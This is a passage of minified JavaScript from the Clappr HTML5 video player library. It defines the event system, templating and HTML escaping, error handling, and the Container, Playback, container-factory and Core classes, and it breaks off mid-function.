0===this._instance&&(this._instance=new this),this._instance},b.setLevel=function(e){this.getInstance().level=e},b.debug=function(){this.getInstance().debug.apply(this.getInstance(),arguments)},b.info=function(){this.getInstance().info.apply(this.getInstance(),arguments)},b.warn=function(){this.getInstance().warn.apply(this.getInstance(),arguments)},b.error=function(){this.getInstance().error.apply(this.getInstance(),arguments)},Array.prototype.slice),cr=/\s+/,dr=function e(t,r,n,i){if(!n)return!0;if("object"===U(n)){for(var a in n)t[r].apply(t,[a,n[a]].concat(i));return!1}if(cr.test(n)){for(var s=n.split(cr),o=0,l=s.length;o<l;o++)t[r].apply(t,[s[o]].concat(i));return!1}return!0},fr=function e(t,r,n,i){var a,s=-1,o=t.length,l=r[0],u=r[1],c=r[2];!function d(){try{switch(r.length){case 0:for(;++s<o;)(a=t[s]).callback.call(a.ctx);return;case 1:for(;++s<o;)(a=t[s]).callback.call(a.ctx,l);return;case 2:for(;++s<o;)(a=t[s]).callback.call(a.ctx,l,u);return;case 3:for(;++s<o;)(a=t[s]).callback.call(a.ctx,l,u,c);return;default:for(;++s<o;)(a=t[s]).callback.apply(a.ctx,r);return}}catch(e){b.error.apply(b,[n,"error on event",i,"trigger","-",e]),d()}}()},k=function(){function n(){u(this,n)}return c(n,[{key:"on",value:function e(t,r,n){return dr(this,"on",t,[r,n])&&r?(this._events||(this._events={}),(this._events[t]||(this._events[t]=[])).push({callback:r,context:n,ctx:n||this}),this):this}},{key:"once",value:function e(t,r,n){var a,i=this;if(!dr(this,"once",t,[r,n])||!r)return this;return a=function e(){!function e(){i.off(t,a)}(),r.apply(this,arguments)},this.on(t,a,n)}},{key:"off",value:function e(t,r,n){var i,a,s,o,l,u,c,d;if(!this._events||!dr(this,"off",t,[r,n]))return this;if(!t&&!r&&!n)return this._events=void 0,this;for(l=0,u=(o=t?[t]:Object.keys(this._events)).length;l<u;l++)if(t=o[l],s=this._events[t]){if(this._events[t]=i=[],r||n)for(c=0,d=s.length;c<d;c++)a=s[c],(r&&r!==a.callback&&r!==a.callback._callback||n&&n!==a.context)&&i.push(a);i.length||delete this._events[t]}return this}},{key:"trigger",value:function e(t){var r=this.name||this.constructor.name;if(b.debug.apply(b,[r].concat(Array.prototype.slice.call(arguments))),!this._events)return this;var n=ur.call(arguments,1);if(!dr(this,"trigger",t,n))return this;var i=this._events[t],a=this._events.all;return i&&fr(i,n,r,t),a&&fr(a,arguments,r,t),this}},{key:"stopListening",value:function e(t,r,n){var i=this._listeningTo;if(!i)return this;var a=!r&&!n;for(var s in n||"object"!==U(r)||(n=this),t&&((i={})[t._listenId]=t),i)(t=i[s]).off(r,n,this),(a||0===Object.keys(t._events).length)&&delete this._listeningTo[s];return this}}],[{key:"register",value:function e(t){n.Custom||(n.Custom={});var r="string"==typeof t&&t.toUpperCase().trim();r&&!n.Custom[r]?n.Custom[r]=r.toLowerCase().split("_").map((function(e,t){return 0===t?e:e=e[0].toUpperCase()+e.slice(1)})).join(""):b.error("Events","Error when register event: "+t)}},{key:"listAvailableCustomEvents",value:function e(){return n.Custom||(n.Custom={}),Object.keys(n.Custom).filter((function(e){return"string"==typeof n.Custom[e]}))}}]),n}(),hr={listenTo:"on",listenToOnce:"once"},r=(Object.keys(hr).forEach((function(a){k.prototype[a]=function(e,t,r){return(this._listeningTo||(this._listeningTo={}))[e._listenId||(e._listenId=Vt("l"))]=e,r||"object"!==U(t)||(r=this),e[hr[a]](t,r,this),this}})),k.PLAYER_READY="ready",k.PLAYER_RESIZE="resize",k.PLAYER_FULLSCREEN="fullscreen",k.PLAYER_PLAY="play",k.PLAYER_PAUSE="pause",k.PLAYER_STOP="stop",k.PLAYER_ENDED="ended",k.PLAYER_SEEK="seek",k.PLAYER_ERROR="playererror",k.ERROR="error",k.PLAYER_TIMEUPDATE="timeupdate",k.PLAYER_VOLUMEUPDATE="volumeupdate",k.PLAYER_SUBTITLE_AVAILABLE="subtitleavailable",k.PLAYBACK_PROGRESS="playback:progress",k.PLAYBACK_TIMEUPDATE="playback:timeupdate",k.PLAYBACK_READY="playback:ready",k.PLAYBACK_BUFFERING="playback:buffering",k.PLAYBACK_BUFFERFULL="playback:bufferfull",k.PLAYBACK_SETTINGSUPDATE="playback:settingsupdate",k.PLAYBACK_LOADEDMETADATA="playback:loadedmetadata",k.PLAYBACK_HIGHDEFINITIONUPDATE="playback:highdefinitionupdate",k.PLAYBACK_BITRATE="playback:bitrate",k.PLAYBACK_LEVELS_AVAILABLE="playback:levels:available",k.PLAYBACK_LEVEL_SWITCH_START="playback:levels:switch:start",k.PLAYBACK_LEVEL_SWITCH_END="playback:levels:switch:end",k.PLAYBACK_PLAYBACKSTATE="playback:playbackstate",k.PLAYBACK_DVR="playback:dvr",k.PLAYBACK_MEDIACONTROL_DISABLE="playback:mediacontrol:disable",k.PLAYBACK_MEDIACONTROL_ENABLE="playback:mediacontrol:enable",k.PLAYBACK_ENDED="playback:ended",k.PLAYBACK_PLAY_INTENT="playback:play:intent",k.PLAYBACK_PLAY="playback:play",k.PLAYBACK_PAUSE="playback:pause",k.PLAYBACK_SEEK="playback:seek",k.PLAYBACK_SEEKED="playback:seeked",k.PLAYBACK_STOP="playback:stop",k.PLAYBACK_ERROR="playback:error",k.PLAYBACK_STATS_ADD="playback:stats:add",k.PLAYBACK_FRAGMENT_LOADED="playback:fragment:loaded",k.PLAYBACK_LEVEL_SWITCH="playback:level:switch",k.PLAYBACK_SUBTITLE_AVAILABLE="playback:subtitle:available",k.PLAYBACK_SUBTITLE_CHANGED="playback:subtitle:changed",k.CORE_CONTAINERS_CREATED="core:containers:created",k.CORE_ACTIVE_CONTAINER_CHANGED="core:active:container:changed",k.CORE_OPTIONS_CHANGE="core:options:change",k.CORE_READY="core:ready",k.CORE_FULLSCREEN="core:fullscreen",k.CORE_RESIZE="core:resize",k.CORE_SCREEN_ORIENTATION_CHANGED="core:screen:orientation:changed",k.CORE_MOUSE_MOVE="core:mousemove",k.CORE_MOUSE_LEAVE="core:mouseleave",k.CONTAINER_PLAYBACKSTATE="container:playbackstate",k.CONTAINER_PLAYBACKDVRSTATECHANGED="container:dvr",k.CONTAINER_BITRATE="container:bitrate",k.CONTAINER_STATS_REPORT="container:stats:report",k.CONTAINER_DESTROYED="container:destroyed",k.CONTAINER_READY="container:ready",k.CONTAINER_RESIZE="container:resize",k.CONTAINER_ERROR="container:error",k.CONTAINER_LOADEDMETADATA="container:loadedmetadata",k.CONTAINER_SUBTITLE_AVAILABLE="container:subtitle:available",k.CONTAINER_SUBTITLE_CHANGED="container:subtitle:changed",k.CONTAINER_TIMEUPDATE="container:timeupdate",k.CONTAINER_PROGRESS="container:progress",k.CONTAINER_PLAY="container:play",k.CONTAINER_STOP="container:stop",k.CONTAINER_PAUSE="container:pause",k.CONTAINER_ENDED="container:ended",k.CONTAINER_CLICK="container:click",k.CONTAINER_DBLCLICK="container:dblclick",k.CONTAINER_CONTEXTMENU="container:contextmenu",k.CONTAINER_MOUSE_ENTER="container:mouseenter",k.CONTAINER_MOUSE_LEAVE="container:mouseleave",k.CONTAINER_MOUSE_UP="container:mouseup",k.CONTAINER_MOUSE_DOWN="container:mousedown",k.CONTAINER_SEEK="container:seek",k.CONTAINER_SEEKED="container:seeked",k.CONTAINER_VOLUME="container:volume",k.CONTAINER_FULLSCREEN="container:fullscreen",k.CONTAINER_STATE_BUFFERING="container:state:buffering",k.CONTAINER_STATE_BUFFERFULL="container:state:bufferfull",k.CONTAINER_SETTINGSUPDATE="container:settingsupdate",k.CONTAINER_HIGHDEFINITIONUPDATE="container:highdefinitionupdate",k.CONTAINER_MEDIACONTROL_SHOW="container:mediacontrol:show",k.CONTAINER_MEDIACONTROL_HIDE="container:mediacontrol:hide",k.CONTAINER_MEDIACONTROL_DISABLE="container:mediacontrol:disable",k.CONTAINER_MEDIACONTROL_ENABLE="container:mediacontrol:enable",k.CONTAINER_STATS_ADD="container:stats:add",k.CONTAINER_OPTIONS_CHANGE="container:options:change",k.MEDIACONTROL_RENDERED="mediacontrol:rendered",k.MEDIACONTROL_FULLSCREEN="mediacontrol:fullscreen",k.MEDIACONTROL_SHOW="mediacontrol:show",k.MEDIACONTROL_HIDE="mediacontrol:hide",k.MEDIACONTROL_MOUSEMOVE_SEEKBAR="mediacontrol:mousemove:seekbar",k.MEDIACONTROL_MOUSELEAVE_SEEKBAR="mediacontrol:mouseleave:seekbar",k.MEDIACONTROL_PLAYING="mediacontrol:playing",k.MEDIACONTROL_NOTPLAYING="mediacontrol:notplaying",k.MEDIACONTROL_CONTAINERCHANGED="mediacontrol:containerchanged",k.MEDIACONTROL_OPTIONS_CHANGE="mediacontrol:options:change",function(e){d(n,e);var r=f(n);function n(){var e,t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return u(this,n),(e=r.call(this,t))._options=t,e.uniqueId=Vt("o"),e}return c(n,[{key:"options",get:function e(){return this._options}}]),n}(k)),pr={evaluate:/<%([\s\S]+?)%>/g,interpolate:/<%=([\s\S]+?)%>/g,escape:/<%-([\s\S]+?)%>/g},vr=/(.)^/,gr={"'":"'","\\":"\\","\r":"r","\n":"n","\t":"t","\u2028":"u2028","\u2029":"u2029"},Ar=/\\|'|\r|\n|\t|\u2028|\u2029/g,mr={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#x27;"},yr=new RegExp("[&<>\"']","g"),Er=function e(t){return null===t?"":(""+t).replace(yr,(function(e){return mr[e]}))},br=0,_=function e(a,t){var r,n=new RegExp([(pr.escape||vr).source,(pr.interpolate||vr).source,(pr.evaluate||vr).source].join("|")+"|$","g"),s=0,o="__p+='";a.replace(n,(function(e,t,r,n,i){return o+=a.slice(s,i).replace(Ar,(function(e){return"\\"+gr[e]})),t&&(o+="'+\n((__t=("+t+"))==null?'':escapeExpr(__t))+\n'"),r&&(o+="'+\n((__t=("+r+"))==null?'':__t)+\n'"),n&&(o+="';\n"+n+"\n__p+='"),s=i+e.length,e})),o+="';\n",pr.variable||(o="with(obj||{}){\n"+o+"}\n"),o="var __t,__p='',__j=Array.prototype.join,print=function(){__p+=__j.call(arguments,'');};\n"+o+"return __p;\n//# sourceURL=/microtemplates/source["+br+++"]";try{r=new Function(pr.variable||"obj","escapeExpr",o)}catch(e){throw e.source=o,e}if(t)return r(t,Er);var i=function e(t){return r.call(this,t,Er)};return i.source="function("+(pr.variable||"obj")+"){\n"+o+"}",i},kr=(_.settings=pr,{getStyleFor:function e(t){var r=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{baseUrl:""};return y('<style class="clappr-style"></style>').html(_(t.toString())(r))}}),_r=/^(\S+)\s*(.*)$/,Tr=function(e){d(n,e);var r=f(n);function n(e){var t;return u(this,n),(t=r.call(this,e)).cid=Vt("c"),t._ensureElement(),t.delegateEvents(),t}return c(n,[{key:"tagName",get:function e(){return"div"}},{key:"events",get:function e(){return{}}},{key:"attributes",get:function e(){return{}}}]),c(n,[{key:"$",value:function e(t){return this.$el.find(t)}},{key:"render",value:function e(){return this}},{key:"destroy",value:function e(){return this.$el.remove(),this.stopListening(),this.undelegateEvents(),this}},{key:"setElement",value:function e(t,r){return this.$el&&this.undelegateEvents(),this.$el=y.zepto.isZ(t)?t:y(t),this.el=this.$el[0],!1!==r&&this.delegateEvents(),this}},{key:"delegateEvents",value:function e(t){for(var r in t||(t=this.events),this.undelegateEvents(),t){var n=t[r];if(n&&n.constructor!==Function&&(n=this[t[r]]),n){var i=r.match(_r),a=i[1],s=i[2];a+=".delegateEvents"+this.cid,""===s?this.$el.on(a,n.bind(this)):this.$el.on(a,s,n.bind(this))}}return this}},{key:"undelegateEvents",value:function e(){return this.$el.off(".delegateEvents"+this.cid),this}},{key:"_ensureElement",value:function e(){if(this.el)this.setElement(this.el,!1);else{var t=y.extend(!0,{},this.attributes);this.id&&(t.id=this.id),this.className&&(t.class=this.className);var r=y(qt.create(this.tagName)).attr(t);this.setElement(r,!1)}}}]),n}(r),T=function(e){d(i,e);var n=f(i);function i(){var e,t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},r=arguments.length>1?arguments[1]:void 0;return u(this,i),(e=n.call(this,t)).core=r,e}return c(i,[{key:"name",get:function e(){return"error"}}],[{key:"Levels",get:function e(){return{FATAL:"FATAL",WARN:"WARN",INFO:"INFO"}}}]),c(i,[{key:"createError",value:function e(t){this.core?this.core.trigger(k.ERROR,t):b.warn(this.name,"Core is not set. Error: ",t)}}]),i}(r),n={createError:function e(t){var r=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{useCodePrefix:!0},n=this.constructor&&this.constructor.type||"",i=this.name||n,a=this.i18n||this.core&&this.core.i18n||this.container&&this.container.i18n,s="".concat(i,":").concat(t&&t.code||"unknown"),o={description:"",level:T.Levels.FATAL,origin:i,scope:n,raw:{}},l=Object.assign({},o,t,{code:r.useCodePrefix?s:t.code});if(a&&l.level==T.Levels.FATAL&&!l.UI){var u={title:a.t("default_error_title"),message:a.t("default_error_message")};l.UI=u}return this.playerError?this.playerError.createError(l):b.warn(i,"PlayerError is not defined. Error: ",l),l}},i=function(e){d(n,e);var r=f(n);function n(e){var t;return u(this,n),(t=r.call(this,e.options)).core=e,t.enabled=!0,t.bindEvents(),t.render(),t}return c(n,[{key:"playerError",get:function e(){return this.core.playerError}}]),c(n,[{key:"bindEvents",value:function e(){}},{key:"getExternalInterface",value:function e(){return{}}},{key:"enable",value:function e(){this.enabled||(this.bindEvents(),this.$el.show(),this.enabled=!0)}},{key:"disable",value:function e(){this.stopListening(),this.$el.hide(),this.enabled=!1}},{key:"render",value:function e(){return this}}]),n}(Tr),Sr=(Object.assign(i.prototype,n),i.extend=function(e){return xt(i,e)},i.type="core",".container[data-container] {\n  position: absolute;\n  background-color: black;\n  height: 100%;\n  width: 100%;\n  max-width: 100%; }\n  .container[data-container] .chromeless {\n    cursor: default; }\n\n[data-player]:not(.nocursor) .container[data-container]:not(.chromeless).pointer-enabled {\n  cursor: pointer; }\n"),Cr=function(e){d(a,e);var i=f(a);function a(e,t,r){var n;return u(this,a),(n=i.call(this,e))._i18n=t,n.currentTime=0,n.volume=100,n.playback=e.playback,n.playerError=r,n.settings=y.extend(!0,{},n.playback.settings),n.isReady=!1,n.mediaControlDisabled=!1,n.plugins=[n.playback],n.dblTapHandler=new Xt(500),n.clickTimer=null,n.clickDelay=200,n.bindEvents(),n}return c(a,[{key:"name",get:function e(){return"Container"}},{key:"attributes",get:function e(){return{class:"container","data-container":""}}},{key:"events",get:function e(){return{click:"clicked",dblclick:"dblClicked",touchend:"dblTap",contextmenu:"onContextMenu",mouseenter:"mouseEnter",mouseleave:"mouseLeave",mouseup:"onMouseUp",mousedown:"onMouseDown"}}},{key:"ended",get:function e(){return this.playback.ended}},{key:"buffering",get:function e(){return this.playback.buffering}},{key:"i18n",get:function e(){return this._i18n}},{key:"hasClosedCaptionsTracks",get:function e(){return this.playback.hasClosedCaptionsTracks}},{key:"closedCaptionsTracks",get:function e(){return this.playback.closedCaptionsTracks}},{key:"closedCaptionsTrackId",get:function e(){return this.playback.closedCaptionsTrackId},set:function e(t){this.playback.closedCaptionsTrackId=t}}]),c(a,[{key:"bindEvents",value:function e(){this.listenTo(this.playback,k.PLAYBACK_PROGRESS,this.onProgress),this.listenTo(this.playback,k.PLAYBACK_TIMEUPDATE,this.timeUpdated),this.listenTo(this.playback,k.PLAYBACK_READY,this.ready),this.listenTo(this.playback,k.PLAYBACK_BUFFERING,this.onBuffering),this.listenTo(this.playback,k.PLAYBACK_BUFFERFULL,this.bufferfull),this.listenTo(this.playback,k.PLAYBACK_SETTINGSUPDATE,this.settingsUpdate),this.listenTo(this.playback,k.PLAYBACK_LOADEDMETADATA,this.loadedMetadata),this.listenTo(this.playback,k.PLAYBACK_HIGHDEFINITIONUPDATE,this.highDefinitionUpdate),this.listenTo(this.playback,k.PLAYBACK_BITRATE,this.updateBitrate),this.listenTo(this.playback,k.PLAYBACK_PLAYBACKSTATE,this.playbackStateChanged),this.listenTo(this.playback,k.PLAYBACK_DVR,this.playbackDvrStateChanged),this.listenTo(this.playback,k.PLAYBACK_MEDIACONTROL_DISABLE,this.disableMediaControl),this.listenTo(this.playback,k.PLAYBACK_MEDIACONTROL_ENABLE,this.enableMediaControl),this.listenTo(this.playback,k.PLAYBACK_SEEK,this.onSeek),this.listenTo(this.playback,k.PLAYBACK_SEEKED,this.onSeeked),this.listenTo(this.playback,k.PLAYBACK_ENDED,this.onEnded),this.listenTo(this.playback,k.PLAYBACK_PLAY,this.playing),this.listenTo(this.playback,k.PLAYBACK_PAUSE,this.paused),this.listenTo(this.playback,k.PLAYBACK_STOP,this.stopped),this.listenTo(this.playback,k.PLAYBACK_ERROR,this.error),this.listenTo(this.playback,k.PLAYBACK_SUBTITLE_AVAILABLE,this.subtitleAvailable),this.listenTo(this.playback,k.PLAYBACK_SUBTITLE_CHANGED,this.subtitleChanged)}},{key:"subtitleAvailable",value:function e(){this.trigger(k.CONTAINER_SUBTITLE_AVAILABLE)}},{key:"subtitleChanged",value:function e(t){this.trigger(k.CONTAINER_SUBTITLE_CHANGED,t)}},{key:"playbackStateChanged",value:function e(t){this.trigger(k.CONTAINER_PLAYBACKSTATE,t)}},{key:"playbackDvrStateChanged",value:function e(t){this.settings=this.playback.settings,this.dvrInUse=t,this.trigger(k.CONTAINER_PLAYBACKDVRSTATECHANGED,t)}},{key:"updateBitrate",value:function e(t){this.trigger(k.CONTAINER_BITRATE,t)}},{key:"statsReport",value:function e(t){this.trigger(k.CONTAINER_STATS_REPORT,t)}},{key:"getPlaybackType",value:function e(){return this.playback.getPlaybackType()}},{key:"isDvrEnabled",value:function e(){return!!this.playback.dvrEnabled}},{key:"isDvrInUse",value:function e(){return!!this.dvrInUse}},{key:"destroy",value:function e(){this.disableResizeObserver(),this.trigger(k.CONTAINER_DESTROYED,this,this.name),this.stopListening(),this.plugins.forEach((function(e){return e.destroy()})),this.$el.remove()}},{key:"setStyle",value:function e(t){this.$el.css(t)}},{key:"animate",value:function e(t,r){return this.$el.animate(t,r).promise()}},{key:"ready",value:function e(){this.isReady=!0,this.trigger(k.CONTAINER_READY,this.name)}},{key:"isPlaying",value:function e(){return this.playback.isPlaying()}},{key:"getStartTimeOffset",value:function e(){return this.playback.getStartTimeOffset()}},{key:"getCurrentTime",value:function e(){return this.currentTime}},{key:"getDuration",value:function e(){return this.playback.getDuration()}},{key:"error",value:function e(t){this.isReady||this.ready(),this.trigger(k.CONTAINER_ERROR,t,this.name)}},{key:"loadedMetadata",value:function e(t){this.trigger(k.CONTAINER_LOADEDMETADATA,t)}},{key:"timeUpdated",value:function e(t){this.currentTime=t.current,this.trigger(k.CONTAINER_TIMEUPDATE,t,this.name)}},{key:"onProgress",value:function e(){for(var t=arguments.length,r=new Array(t),n=0;n<t;n++)r[n]=arguments[n];this.trigger.apply(this,[k.CONTAINER_PROGRESS].concat(r,[this.name]))}},{key:"playing",value:function e(){this.trigger(k.CONTAINER_PLAY,this.name)}},{key:"paused",value:function e(){this.trigger(k.CONTAINER_PAUSE,this.name)}},{key:"play",value:function e(){this.playback.play()}},{key:"stop",value:function e(){this.playback.stop(),this.currentTime=0}},{key:"pause",value:function e(){this.playback.pause()}},{key:"onEnded",value:function e(){this.trigger(k.CONTAINER_ENDED,this,this.name),this.currentTime=0}},{key:"stopped",value:function e(){this.trigger(k.CONTAINER_STOP)}},{key:"clicked",value:function e(){var t=this;this.options.chromeless&&!this.options.allowUserInteraction||(this.clickTimer=setTimeout((function(){t.clickTimer&&t.trigger(k.CONTAINER_CLICK,t,t.name)}),this.clickDelay))}},{key:"cancelClicked",value:function e(){clearTimeout(this.clickTimer),this.clickTimer=null}},{key:"dblClicked",value:function e(){this.options.chromeless&&!this.options.allowUserInteraction||(this.cancelClicked(),this.trigger(k.CONTAINER_DBLCLICK,this,this.name))}},{key:"dblTap",value:function e(t){var r=this;this.options.chromeless&&!this.options.allowUserInteraction||this.dblTapHandler.handle(t,(function(){r.cancelClicked(),r.trigger(k.CONTAINER_DBLCLICK,r,r.name)}))}},{key:"onContextMenu",value:function e(t){this.options.chromeless&&!this.options.allowUserInteraction||this.trigger(k.CONTAINER_CONTEXTMENU,t,this.name)}},{key:"seek",value:function e(t){this.playback.seek(t)}},{key:"onSeek",value:function e(t){this.trigger(k.CONTAINER_SEEK,t,this.name)}},{key:"onSeeked",value:function e(){this.trigger(k.CONTAINER_SEEKED,this.name)}},{key:"seekPercentage",value:function e(t){var r=this.getDuration();if(t>=0&&t<=100){var n=r*(t/100);this.seek(n)}}},{key:"setVolume",value:function e(t){this.volume=parseFloat(t),this.trigger(k.CONTAINER_VOLUME,this.volume,this.name),this.playback.volume(this.volume)}},{key:"fullscreen",value:function e(){this.trigger(k.CONTAINER_FULLSCREEN,this.name)}},{key:"onBuffering",value:function e(){this.trigger(k.CONTAINER_STATE_BUFFERING,this.name)}},{key:"bufferfull",value:function e(){this.trigger(k.CONTAINER_STATE_BUFFERFULL,this.name)}},{key:"addPlugin",value:function e(t){this.plugins.push(t)}},{key:"hasPlugin",value:function e(t){return!!this.getPlugin(t)}},{key:"getPlugin",value:function e(t){return this.plugins.filter((function(e){return e.name===t}))[0]}},{key:"mouseEnter",value:function e(){this.options.chromeless&&!this.options.allowUserInteraction||this.trigger(k.CONTAINER_MOUSE_ENTER)}},{key:"mouseLeave",value:function e(){this.options.chromeless&&!this.options.allowUserInteraction||this.trigger(k.CONTAINER_MOUSE_LEAVE)}},{key:"mouseUp",value:function e(){this.options.chromeless&&!this.options.allowUserInteraction||this.trigger(k.CONTAINER_MOUSE_UP)}},{key:"mouseDown",value:function e(){this.options.chromeless&&!this.options.allowUserInteraction||this.trigger(k.CONTAINER_MOUSE_DOWN)}},{key:"settingsUpdate",value:function e(){this.settings=this.playback.settings,this.trigger(k.CONTAINER_SETTINGSUPDATE)}},{key:"highDefinitionUpdate",value:function e(t){this.trigger(k.CONTAINER_HIGHDEFINITIONUPDATE,t)}},{key:"isHighDefinitionInUse",value:function e(){return this.playback.isHighDefinitionInUse()}},{key:"disableMediaControl",value:function e(){this.mediaControlDisabled||(this.mediaControlDisabled=!0,this.trigger(k.CONTAINER_MEDIACONTROL_DISABLE))}},{key:"enableMediaControl",value:function e(){this.mediaControlDisabled&&(this.mediaControlDisabled=!1,this.trigger(k.CONTAINER_MEDIACONTROL_ENABLE))}},{key:"updateStyle",value:function e(){!this.options.chromeless||this.options.allowUserInteraction?this.$el.removeClass("chromeless"):this.$el.addClass("chromeless")}},{key:"enableResizeObserver",value:function e(){var t=this;this.disableResizeObserver(),this.resizeObserverInterval=setInterval((function(){return t.checkResize()}),500)}},{key:"disableResizeObserver",value:function e(){this.resizeObserverInterval&&clearInterval(this.resizeObserverInterval)}},{key:"checkResize",value:function e(){var t={width:this.el.clientWidth,height:this.el.clientHeight},r=this.currentSize||{},n=r.width;(r.height!==t.height||n!==t.width)&&(this.currentSize=t,this.trigger(k.CONTAINER_RESIZE,t))}},{key:"configure",value:function e(t){this._options=y.extend(!0,this._options,t),this.updateStyle(),this.playback.configure(this.options),this.trigger(k.CONTAINER_OPTIONS_CHANGE)}},{key:"render",value:function e(){var t=kr.getStyleFor(Sr.toString(),{baseUrl:this.options.baseUrl});return this.$el.append(t[0]),this.$el.append(this.playback.render().el),this.updateStyle(),this.checkResize(),this.enableResizeObserver(),this}}]),a}(Tr),S=(Object.assign(Cr.prototype,n),function(e){d(a,e);var i=f(a);function a(e,t,r){var n;return u(this,a),(n=i.call(this,e)).settings={},n._i18n=t,n.playerError=r,n._consented=!1,n}return c(a,[{key:"isAudioOnly",get:function e(){return!1}},{key:"isAdaptive",get:function e(){return!1}},{key:"ended",get:function e(){return!1}},{key:"i18n",get:function e(){return this._i18n}},{key:"buffering",get:function e(){return!1}}]),c(a,[{key:"consent",value:function e(t){"function"==typeof t&&t()}},{key:"play",value:function e(){}},{key:"pause",value:function e(){}},{key:"stop",value:function e(){}},{key:"seek",value:function e(t){}},{key:"seekPercentage",value:function e(t){}},{key:"getStartTimeOffset",value:function e(){return 0}},{key:"getDuration",value:function e(){return 0}},{key:"isPlaying",value:function e(){return!1}},{key:"getPlaybackType",value:function e(){return a.NO_OP}},{key:"isHighDefinitionInUse",value:function e(){return!1}},{key:"mute",value:function e(){}},{key:"unmute",value:function e(){}},{key:"volume",value:function e(t){}},{key:"configure",value:function e(t){this._options=y.extend(!0,this._options,t)}},{key:"attemptAutoPlay",value:function e(){var r=this;this.canAutoPlay((function(e,t){e&&r.play()}))}},{key:"canAutoPlay",value:function e(t){t(!0,null)}},{key:"isReady",get:function e(){return!1}},{key:"hasClosedCaptionsTracks",get:function e(){return this.closedCaptionsTracks.length>0}},{key:"closedCaptionsTracks",get:function e(){return[]}},{key:"closedCaptionsTrackId",get:function e(){return-1},set:function e(t){}}]),a}(Tr)),Rr=(Object.assign(S.prototype,n),S.extend=function(e){return xt(S,e)},S.canPlay=function(e,t){return!1},S.VOD="vod",S.AOD="aod",S.LIVE="live",S.NO_OP="no_op",S.type="playback",function(e){d(s,e);var a=f(s);function s(e,t,r,n){var i;return u(this,s),(i=a.call(this,e))._i18n=r,i.loader=t,i.playerError=n,i}return c(s,[{key:"options",get:function e(){return this._options},set:function e(t){this._options=t}}]),c(s,[{key:"createContainers",value:function e(){var t=this;return y.Deferred((function(e){e.resolve(t.options.sources.map((function(e){return t.createContainer(e)})))}))}},{key:"findPlaybackPlugin",value:function e(t,r){return this.loader.playbackPlugins.filter((function(e){return e.canPlay(t,r)}))[0]}},{key:"createContainer",value:function e(t){var r=null,n=this.options.mimeType;"object"===U(t)?(r=t.source.toString(),t.mimeType&&(n=t.mimeType)):r=t.toString(),r.match(/^\/\//)&&(r=window.location.protocol+r);var i=K(K({},this.options),{},{src:r,mimeType:n}),a=this.findPlaybackPlugin(r,n),s=a?new a(i,this._i18n,this.playerError):new S;i=K(K({},i),{},{playback:s});var o=new Cr(i,this._i18n,this.playerError),l=y.Deferred();return l.promise(o),this.addContainerPlugins(o),this.listenToOnce(o,k.CONTAINER_READY,(function(){return l.resolve(o)})),o}},{key:"addContainerPlugins",value:function e(t){this.loader.containerPlugins.forEach((function(e){t.addPlugin(new e(t))}))}}]),s}(r)),Lr=function(e){d(n,e);var r=f(n);function n(e){var t;return u(this,n),(t=r.call(this,e)).playerError=new T(e,z(t)),t.configureDomRecycler(),t.firstResize=!0,t.plugins=[],t.containers=[],t._boundFullscreenHandler=function(){return t.handleFullscreenChange()},y(document).bind("fullscreenchange",t._boundFullscreenHandler),y(document).bind("MSFullscreenChange",t._boundFullscreenHandler),y(document).bind("mozfullscreenchange",t._boundFullscreenHandler),E.isMobile&&y(window).bind("resize",(function(e){t.handleWindowResize(e)})),t}return c(n,[{key:"events",get:function e(){return{webkitfullscreenchange:"handleFullscreenChange",mousemove:"onMouseMove",mouseleave:"onMouseLeave"}}},{key:"attributes",get:function e(){return{"data-player":"",tabindex:9999}}},{key:"isReady",get:function e(){return!!this.ready}},{key:"i18n",get:function e(){return this.getPlugin("strings")||{t:function e(t){return t}}}},{key:"mediaControl",get:function e(){return this._mediaControl||(this._mediaControl=this.getPlugin("media_control"))||this.dummyMediaControl}},{key:"dummyMediaControl",get:function e(){return this._dummyMediaControl||(this._dummyMediaControl=new i(this)),this._dummyMediaControl}},{key:"activeContainer",get:function e(){return this._activeContainer},set:function e(t){this._activeContainer=t,this.trigger(k.CORE_ACTIVE_CONTAINER_CHANGED,this._activeContainer)}},{key:"activePlayback",get:function e(){return this.activeContainer&&this.activeContainer.playback}}]),c(n,[{key:"configureDomRecycler",value:function e(){var t=this.options&&this.options.playback&&this.options.playback.recycleVideo;qt.configure({recycleVideo:t})}},{key:"createContainers",value:function e(t){this.defer=y.Deferred(),this.defer.promise(this),this.containerFactory=new Rr(t,t.loader,this.i18n,this.playerError),this.prepareContainers()}},{key:"prepareContainers",value:function e(){var t=this;this.containerFactory.createContainers().then((function(e){return t.setupContainers(e)})).then((function(e){return t.resolveOnContainersReady(e)}))}},{key:"updateSize",value:function e(){this.isFullscreen()?this.setFullscreen():this.setPlayerSize()}},{key:"setFullscreen",value:function e(){E.isiOS||(this.$el.addClass("fullscreen"),this.$el.removeAttr("style"),this.previousSize={width:this.options.width,height:this.options.height},this.currentSize={width:y(window).width(),height:y(window).height()})}},{key:"setPlayerSize",value:function e(){this.$el.removeClass("fullscreen"),this.currentSize=this.previousSize,this.previousSize={width:y(window).width(),height:y(window).height()},this.resize(this.currentSize)}},{key:"resize",value:function e(t){Gt(t.height)||Gt(t.width)?(this.el.style.height="".concat(t.height,"px"),this.el.style.width="".concat(t.width,"px")):(this.el.style.height="".concat(t.height),this.el.style.width="".concat(t.width)),this.previousSize={width:this.options.width,height:this.options.height},this.options.width=t.width,this.options.height=t.height,this.currentSize=t,this.triggerResize(this.currentSize)}},{key:"enableResizeObserver",value:function e(){var t=this;this.disableResizeObserver();this.resizeObserverInterval=setInterval((function e(){t.triggerResize({width:t.el.clientWidth,height:t.el.clientHeight})}),500)}},{key:"triggerResize",value:function e(t){(this.firstResize||this.oldHeight!==t.height||this.oldWidth!==t.width)&&(this.oldHeight=t.height,this.oldWidth=t.width,this.computedSize=t,this.firstResize=!1,this.trigger(k.CORE_RESIZE,t))}},{key:"disableResizeObserver",value:function e(){this.resizeObserverInterval&&clearInterval(this.resizeObserverInterval),this.resizeObserverInterval=null}},{key:"resolveOnContainersReady",value:function e(t){var r=this;y.when.apply(y,t).done((function(){r.defer.resolve(r),r.ready=!0,r.trigger(k.CORE_READY)}))}},{key:"addPlugin",value:function e(t){this.plugins.push(t)}},{key:"hasPlugin",value:function e(t){return!!this.getPlugin(t)}},{key:"getPlugin",value:function e(t){return 